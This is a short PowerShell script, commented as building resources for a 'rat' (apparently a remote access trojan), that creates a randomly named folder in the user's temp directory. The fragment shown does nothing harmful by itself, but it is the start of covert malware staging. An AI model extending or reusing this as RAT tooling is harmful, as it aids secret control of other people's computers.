# Builds resources for rat

# Function to generate random text for directory name
function random_text {
    $chars = ([char[]]([char]'A'..[char]'Z') + ([char[]]([char]'a'..[char]'z')))
    $randomChars = Get-Random -InputObject $chars -Count 5
    return -join $randomChars
}

# Change directory to the temporary folder
Set-Location $env:temp

# Generate a random directory name
$directory_name = random_text

# Create the directory
New-Item -ItemType Directory -Name $directory_name
